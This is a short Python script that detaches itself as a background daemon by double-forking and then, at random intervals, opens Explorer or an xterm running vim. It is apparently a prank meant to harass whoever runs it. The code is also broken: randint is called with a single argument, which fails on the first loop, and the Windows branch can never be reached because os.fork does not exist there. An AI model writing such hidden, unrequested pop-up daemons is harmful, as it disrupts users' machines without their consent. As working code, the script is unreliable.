#!/usr/bin/env python
# -*- coding: utf-8 -*-

from os         import fork
from os         import name     as currentOS
from os         import setsid
from os         import system
from random     import randint
from subprocess import call
from sys        import exit
from time       import sleep

HEURE       = 3600
DEMI_HEURE  = 1800
MINUTE      = 60

if __name__ == "__main__":
    pid = fork()
    if pid==0:
        setsid()
        pid = fork()
        if pid==0:
            while True:
                rand = randint(MINUTE)
                sleep(rand)
                if currentOS == 'nt':
                    system("start %windir%\explorer.exe")
                else:
                    call(["xterm","-b","5000","vim"])
        else:
            exit(0)
    else:
        exit(0)
